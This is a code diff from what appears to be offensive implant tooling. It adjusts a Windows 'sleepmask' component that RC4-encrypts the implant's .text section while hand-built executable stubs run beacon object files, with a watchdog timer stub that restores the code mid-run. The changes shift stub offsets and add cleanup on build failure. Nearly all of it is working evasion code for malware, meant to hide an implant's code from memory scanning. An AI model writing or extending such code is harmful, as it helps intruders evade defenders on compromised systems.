@@ -104,8 +104,8 @@ static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */
 
 #define BW_ENTER_OFF 0x000
 #define BW_EXIT_OFF  0x060
-#define BW_WATCH_OFF 0x0C0
-#define BW_CTXQ_OFF  0x140   /* after the watchdog tail-jump data qword */
+#define BW_WATCH_OFF 0x0E0
+#define BW_CTXQ_OFF  0x160   /* after the watchdog tail-jump data qword */
 
 /* RC4-with-counter, byte-for-byte the gen3 scheme (sleepmask_gen3.cpp):
  * round-tripping a block under a DIFFERENT counter would corrupt it. */
@@ -411,6 +411,7 @@ static BOOL bw_build_pages(void)
 	memset(g_bw_ctx, 0, sizeof(BW_CTX));
 	memset(g_bw_stubs, 0, 0x1000);
 	p = g_bw_stubs;
+#define BW_BUILD_FAIL() do { 	VirtualFree(g_bw_ctx, 0, MEM_RELEASE);  g_bw_ctx = NULL; 	VirtualFree(g_bw_stubs, 0, MEM_RELEASE); g_bw_stubs = NULL; 	return FALSE; } while (0)
 
 	/* ---- enter_stub (called from C, rsp%16==8, [rsp]=ret_to_C) ----
 	 * Stack contract (the first two builds were off by 8: push must land
@@ -469,7 +470,7 @@ static BOOL bw_build_pages(void)
 	e[0] = 0xFF; e[1] = 0x60; e[2] = 0x20;                          /* jmp [rax+0x20] entry */
 	e += 3;
 	if ((int)(e - (p + BW_ENTER_OFF)) > 0x60)
-		return FALSE;
+		BW_BUILD_FAIL();
 
 	/* ---- exit_stub (BOF's ret lands here, rsp%16==0, .text=RW-cipher) ----
 	 * mov rax,[rip+ctx]; mov ecx,2; xchg ecx,[rax]; cmp ecx,1; jne ret
@@ -521,8 +522,8 @@ static BOOL bw_build_pages(void)
 	e = bw_put32(e + 2, 0x80);
 	e[0] = 0xC3;                                                     /* ret */
 	e += 1;
-	if ((int)(e - (p + BW_EXIT_OFF)) > 0x60)
-		return FALSE;
+	if ((int)(e - (p + BW_EXIT_OFF)) > 0x70)
+		BW_BUILD_FAIL();
 
 	/* ---- watchdog_stub (timer callback, rsp%16==8; fires mid-BOF) ----
 	 * same claim+restore sequence (sub 0x28 for call alignment), then
@@ -585,14 +586,15 @@ static BOOL bw_build_pages(void)
 	e[0] = 0xC3;                                                     /* wd_ret: ret */
 	e += 1;
 	if ((int)(e - (p + BW_WATCH_OFF)) > 0x80)
-		return FALSE;
+		BW_BUILD_FAIL();
 
 	/* the ctx qword all three stubs load rip-relatively */
 	bw_put64(p + BW_CTXQ_OFF, (unsigned long long)(size_t)g_bw_ctx);
 
 	if (!VirtualProtect(p, 0x1000, PAGE_EXECUTE_READ, &old))
-		return FALSE;
+		BW_BUILD_FAIL();
 	FlushInstructionCache(GetCurrentProcess(), p, 0x1000);
+#undef BW_BUILD_FAIL
 	return TRUE;
 }
 
